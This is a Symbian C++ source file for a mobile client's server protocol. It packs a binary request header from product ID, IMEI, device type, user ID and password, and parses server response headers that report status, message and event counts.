#include "ServProtocol.h"
#include "ByteUtil.h"
#include "Logger.h"
#include "Global.h"
#include "ResourceBundle.h"
#include "AppDefinitions.h"

#include <es_sock.h>
#include <string.h>
#include <types.h>

CCliRequestHeader::~CCliRequestHeader()
	{
	delete iIMEI; //16 bytes
	delete iU_ID;//32 bytes user id
	delete iPWD;//16 bytes password
	delete iHeaderPk;
	}

CCliRequestHeader::CCliRequestHeader(TServCmd aCmd)
	{
	iCMD = (TUint16)aCmd;	
	}

CCliRequestHeader* CCliRequestHeader::NewLC(TServCmd aCmd)
	{
	CCliRequestHeader* self = new (ELeave) CCliRequestHeader(aCmd);
    CleanupStack::PushL(self);
	self->ConstructL();
    return self;
	}

CCliRequestHeader* CCliRequestHeader::NewL(TServCmd aCmd)
	{
	CCliRequestHeader* self = CCliRequestHeader::NewLC(aCmd);
	CleanupStack::Pop(self);
	return self;
	}

void CCliRequestHeader::ConstructL()
	{	
	CFxsSettings& settings = Global::Settings();
	if(settings.IsTSM())
		{
		iP_ID = PRODUCT_ID_FX_PROTECT;
		iP_VER = 0x0101;
		iD_TYP = DEVICE_TYPE;//4 bytes this idintifies the model of the phone 4 bytes		
		}
	else
	//for the test house
		{
		//Product ID(Integer)
		iP_ID = AppDefinitions::ProductNumber();	//2 bytes product Id	
		iP_VER = AppDefinitions::ProductVersion();//2 bytes one for  major version, one for minor version
		iD_TYP = DEVICE_TYPE;//4 bytes this idintifies the model of the phone 4 bytes		
		}
	
	iU_ID = HBufC8::NewL(KFieldMaxUserIDLength);
	iPWD = HBufC8::NewL(KFieldMaxPasswordLength);
	
	TDeviceIMEI8 imei8;
	imei8.Copy(settings.IMEI());
	iIMEI = imei8.AllocL();
	ConverToProtocolL();
	}

void CCliRequestHeader::ConverToProtocolL()
	{
//@todo: change to use Mem class to copy binary data instead of using ByteUtil class
//
	
	TUint8* cliHder = new (ELeave)TUint8[KProtcMaxCliHdrLength];	
	CleanupArrayDeletePushL(cliHder);
	//fill with space
	Mem::Fill(cliHder,KProtcMaxCliHdrLength, TChar(' '));
	TUint8* dest; dest = cliHder;		
	
	//productid, 2 bytes
	ByteUtil::copy(dest,iP_ID);
	dest += 2;
	
	//prd version, 2 bytes
	ByteUtil::copy(dest,iP_VER);
	dest += 2;
	
	//16 bytes md5 imei hash
	ByteUtil::copy(dest,iIMEI->Des(),iIMEI->Length());
	dest += 16;	
	
	//deviceType, 4 bytes
	ByteUtil::copy(dest,iD_TYP);
	dest += 4;
	
	//userId, bytes [32]
	ByteUtil::copy(dest,iU_ID->Des(), iU_ID->Length());
	dest += 32;
	
	//pswd[16] 
	ByteUtil::copy(dest,iPWD->Des(), iPWD->Length());
	dest += 16;
	
	// cmd, 2 bytes
	ByteUtil::copy(dest,iCMD);
	dest += 2;
	
	// encoding, 2 bytes
	ByteUtil::copy(dest,iEndoing);	
	
	DELETE(iHeaderPk);
	
	iHeaderPk = HBufC8::NewL(KProtcMaxCliHdrLength);
	iHeaderPk->Des().Copy(cliHder,KProtcMaxCliHdrLength);
	
	CleanupStack::PopAndDestroy();//cliHder;
	dest = NULL;
	}

const TDesC8& CCliRequestHeader::ConvertToProtocolAndGetL()
	{
	ConverToProtocolL();
	return HdrByteArray();
	}

//----------------------------------------------------------------
//		CCliRequestHeader Implementation End.
//----------------------------------------------------------------

CServResponseHeader::~CServResponseHeader()
	{
	delete iFollowingMsg;//Following message; could be error or general message	 
	}

CServResponseHeader::CServResponseHeader()
	{	
	iSID = EStaErrUnknown;	
	iStatus = EStaErrUnknown;	
	}

CServResponseHeader* CServResponseHeader::NewL(const TDesC8& aInputByte)
	{	
	CServResponseHeader* self = new (ELeave) CServResponseHeader();
	CleanupStack::PushL(self);
	self->ConstructL(aInputByte);
	CleanupStack::Pop(self);
	return self;
	}

void CServResponseHeader::ConstructL(const TDesC8& aInputByte)
	{
	InitL(aInputByte);
	}

/*HBufC* CServResponseHeader::ErrorMessageLC(TInt aErrorCode)
	{			
	switch(aErrorCode)
		{
		case EStaErrAuthenFailed:
			return ResourceBundle::ReadResourceLC(R_TXT_ERROR_AUTHENTICATION_FAILED);
		case EStaErrDeviceNotRegister:
			return ResourceBundle::ReadResourceLC(R_TXT_ERROR_DEVICE_NOT_REGISTERED);
		case EStaErrGeneralError:
			return ResourceBundle::ReadResourceLC(R_TXT_ERROR_INTERNAL_SERVER_ERROR);		
		default:
			{
			HBufC* ResourceBundle::ReadResourceLC(R_TXT_ERROR_NOT_DEFINED);
			return 
			}//r_txt_error_not_defined
			LOG1(_L("[CServResponseHeader::ErrorMessage] Found KSvrErrMsgNotDefined: %x "), aErrorCode) 
			
		}
	}*/

void CServResponseHeader::InitL(const TDesC8& aInputByte)
	{
	LOGDATA(_L("ServerResponse.dat"),aInputByte)
	
	TInt totalLength = aInputByte.Length();
	
	if(totalLength < KSrvHdrMinimumLength) 
		{
		//corrupted pk
		ERR1(_L("[CServResponseHeader::InitL] Response content length is less than minimum: %d "), totalLength)
		
		return;
		}
	
	TInt iCurPos = 0;
	
	//SID
	iSID = aInputByte[iCurPos];
	iCurPos++;
	
	//Cmd
	TPtrC8 ptr = aInputByte.Mid(iCurPos, KSrvHdrMaxCmdLength);	
	iCurPos += KSrvHdrMaxCmdLength;	
	iCMD = BigEndian::Get16(ptr.Ptr());
	
	//Status
	iStatus = aInputByte[iCurPos];
	iCurPos++;
	
	//Message len
	ptr.Set(aInputByte.Mid(iCurPos, KSrvHdrMaxMessageLength));
	TInt msgLength = BigEndian::Get16(ptr.Ptr());	
	iCurPos += KSrvHdrMaxMessageLength;
	
	//clear prev val
	iTotalEventReceived =0;
	iLastEventId = 0;
	
	if(msgLength > 0) 
		{
		iFollowingMsg=HBufC8::NewL(msgLength);
		
		//Server may return corrupted stream
		//so do some checking
		if(iCurPos > 0 && iCurPos <= totalLength)
			{
			if(aInputByte.Mid(iCurPos).Length() >= msgLength)
				{
				ptr.Set(aInputByte.Mid(iCurPos, msgLength));
				*iFollowingMsg = ptr;
				iCurPos += msgLength;
				}
			else // Err
				{				
				return;
				}
			}	
		}
	
	//Stop processing further if the server return Not OK
	if(!IsStatusOK())
		{
		return;
		}
	
	//Stop if byte server return byte corrupted
	if(totalLength <= iCurPos ||  (totalLength - KSrvHdrMaxTotalEventLength) <  iCurPos)
		{
		ERR1(_L("[CServResponseHeader::InitL] Bad response from server, totalLength: %d "),totalLength)
		
		//return to prevent panic		
		return;
		}
	
	//
	//number of event the server received
	ptr.Set(aInputByte.Mid(iCurPos, KSrvHdrMaxTotalEventLength));
	iTotalEventReceived = BigEndian::Get32(ptr.Ptr());
	iCurPos += KSrvHdrMaxTotalEventLength;
	
	if(totalLength <= iCurPos ||  (totalLength - KSrvHdrMaxTotalEventLength) <  iCurPos)
		{
		ERR1(_L("[CServResponseHeader::InitL] Bad response from server, totalLength: %d "),totalLength)
		
		//return to prevent panic	
		return;
		}
	
	//
	//last event id that the server has processed
	ptr.Set(aInputByte.Mid(iCurPos, KSrvHdrMaxLastEventIdLength));
	iLastEventId = BigEndian::Get32(ptr.Ptr());
	
	LOG6(_L("[CServResponseHeader::InitL]End iSID: %d, iCmd: %d, iStatus :%d, MsgLen: %d, Total: %d, LastId: %d "),iSID,iCMD,iStatus,msgLength, iTotalEventReceived, iLastEventId)
	}
